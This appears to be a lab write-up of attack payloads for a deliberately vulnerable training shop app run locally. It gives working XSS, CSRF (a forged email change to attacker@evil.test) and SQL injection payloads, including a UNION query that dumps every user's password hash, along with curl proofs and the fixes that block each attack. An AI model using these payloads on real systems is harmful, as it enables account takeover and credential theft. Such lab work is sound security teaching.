# PAYLOADS — ShopSmart Part 2

Every working attack payload, the exact endpoint/field, why it works, and how the
SAFE build blocks it. Examples use `BASE=http://localhost:3000` (the build-machine
evidence used `:3010` for vuln and `:3011` for safe — see `evidence/`).

Start the vulnerable server first:

```bash
npm run seed && npm run start:vuln      # or: VULN=true PORT=3010 npm start
```

---

## 1. XSS

| Type | Endpoint / field | Payload | Why it works (VULN) | Safe fix |
|------|------------------|---------|---------------------|----------|
| Reflected | `GET /search` field `q` | `<script>alert('xss')</script>` | `q` is written into the page with EJS `<%- q %>` (unescaped) | `<%= q %>` HTML-escapes it; CSP blocks inline script |
| Stored | review form `POST /product/:id/review` field `body` | `<script>alert('stored-xss')</script>` | review body rendered with `<%- r.body %>`; executes for every viewer | `<%= r.body %>` escapes on render; CSP |
| DOM-based | product page URL fragment | `http://localhost:3000/product/2#<img src=x onerror=alert(1)>` | `public/js/dom.js` runs `el.innerHTML = location.hash` | SAFE mode uses `el.textContent` (inert) |

**Reflected — curl proof (payload comes back unescaped):**
```bash
curl -s -G "$BASE/search" --data-urlencode "q=<script>alert('xss')</script>" | grep "You searched for"
# VULN:  You searched for: <script>alert('xss')</script>
# SAFE:  You searched for: &lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;
```

**Stored — curl proof:**
```bash
curl -s -X POST "$BASE/product/2/review" \
  --data-urlencode "author=mallory" --data-urlencode "rating=5" \
  --data-urlencode "body=<script>alert('stored-xss')</script>"
curl -s "$BASE/product/2" | grep stored-xss
# VULN: raw <script>…</script> present in HTML; SAFE: &lt;script&gt;…
```

**DOM-based:** open in a browser (needs JS execution):
`http://localhost:3000/product/2#<img src=x onerror=alert(1)>`
VULN pops the alert; SAFE prints the text literally.

Evidence: `evidence/xss-checks.txt`, `evidence/safe-mode-verification.txt`.

---

## 2. CSRF

| Endpoint | Method | Payload | Why it works (VULN) | Safe fix |
|----------|--------|---------|---------------------|----------|
| `/account/change-email` | POST | `email=attacker@evil.test` (no token) | no CSRF token required; session cookie has no SameSite restriction | synchronizer `_csrf` token validated + `SameSite=Strict` cookie |
| `/account/change-password` | POST | `password=pwned` (no token) | same | same |

**Proof of concept:** [`attacker.html`](./attacker.html) — an auto-submitting form.
While logged in to ShopSmart, open the attacker page; the victim's email is silently
changed.

```bash
# different origin, to show a true cross-site attack
python3 -m http.server 8080   # serves attacker.html
# then, while logged in at :3000, browse to http://localhost:8080/attacker.html
```

**curl proof (VULN — forged POST with only the session cookie succeeds):**
```bash
curl -s -c cj -X POST "$BASE/login" --data-urlencode "username=alice" --data-urlencode "password=password1"
curl -s -b cj -X POST "$BASE/account/change-email" \
  -H "Origin: http://evil.test" --data-urlencode "email=attacker@evil.test"
curl -s -b cj "$BASE/profile" | grep "Current email"   # -> attacker@evil.test
```
In SAFE mode the same forged POST returns **HTTP 403** (invalid CSRF token) and the
email is unchanged.

Evidence: `evidence/csrf-vuln.txt`, `evidence/safe-mode-verification.txt`.

---

## 3. SQL Injection

All three run against string-concatenated queries in VULN mode and are neutralised
by prepared statements in SAFE mode.

### 3a. Easy — authentication bypass (`POST /login`, field `username`)

| Payload (username) | Password |
|--------------------|----------|
| `' OR '1'='1' -- ` | anything |
| `admin' -- ` | anything (logs in as a chosen user) |

Why: the query becomes
`SELECT * FROM users WHERE username = '' OR '1'='1' -- ' AND password_hash = '…'`
— the `--` comments out the password check and `OR '1'='1'` is always true, so the
first user (admin) is returned.

```bash
curl -s -i -c cj -X POST "$BASE/login" \
  --data-urlencode "username=' OR '1'='1' -- " --data-urlencode "password=whatever"
# VULN: 302 -> /dashboard (logged in as admin);  SAFE: "Invalid credentials"
```

### 3b. Intermediate — blind boolean-based (`GET /api/user-exists`, field `u`)

The endpoint only returns `{"exists":true|false}` — no data echoed — so you infer
data one bit at a time.

| Goal | Payload (`u=`) | Result |
|------|----------------|--------|
| TRUE probe | `admin' AND '1'='1` | `{"exists":true}` |
| FALSE probe | `admin' AND '1'='2` | `{"exists":false}` |
| Extract char 1 of admin hash | `admin' AND substr((SELECT password_hash FROM users WHERE username='admin'),1,1)='2` | `true` (char is `2`) |
| Wrong guess | `admin' AND substr((SELECT password_hash FROM users WHERE username='admin'),1,1)='a` | `false` |

```bash
curl -s -G "$BASE/api/user-exists" --data-urlencode "u=admin' AND '1'='1"   # true
curl -s -G "$BASE/api/user-exists" --data-urlencode "u=admin' AND '1'='2"   # false
```
Iterate `substr(...,N,1)='X'` over positions to extract any value character-by-character.

### 3c. Advanced — UNION-based data exfiltration (`GET /search`, field `q`)

The search query is `SELECT id, name, price FROM products WHERE name LIKE '%<q>%'`
(3 columns). Full chain:

| Step | Payload (`q=`) | Reveals |
|------|----------------|---------|
| 1. column count | `xyz' ORDER BY 3 -- ` (ok) / `xyz' ORDER BY 4 -- ` (error) | 3 columns |
| 2. confirm | `xyz' UNION SELECT 1,2,3 -- ` | row `1 / 2 / 3` |
| 3. table names | `xyz' UNION SELECT 1,name,3 FROM sqlite_master WHERE type='table' -- ` | `products, reviews, sqlite_sequence, users` |
| 4. column names | `xyz' UNION SELECT 1,sql,3 FROM sqlite_master WHERE name='users' -- ` | `users` DDL (id, username, email, password_hash, …) |
| 5. **dump creds** | `xyz' UNION SELECT id,username,password_hash FROM users -- ` | every username + SHA-256 password hash |

```bash
curl -s -G "$BASE/search" \
  --data-urlencode "q=xyz' UNION SELECT id,username,password_hash FROM users -- "
# VULN: table lists admin + its hash 240be518…;  SAFE: "No products matched."
```

Why it works: `xyz` matches no product, so the result set is purely the attacker's
`UNION SELECT`. In SAFE mode the term is bound as a parameter to `LIKE ?`, so the
quote cannot break out of the string literal.

Evidence: `evidence/sqli-easy-login-bypass.txt`, `evidence/sqli-intermediate-blind.txt`,
`evidence/sqli-advanced-union.txt`, `evidence/safe-mode-verification.txt`.

---

## Recovered credentials (from the UNION dump, cracked offline)

The dumped SHA-256 hashes correspond to the seed passwords, e.g.
`admin:240be518…` = `admin123`, `alice:0b14d501…` = `password1`. In a real breach an
attacker would run these hashes through a wordlist — which is exactly why unsalted
fast hashes are themselves a finding worth noting in the report.
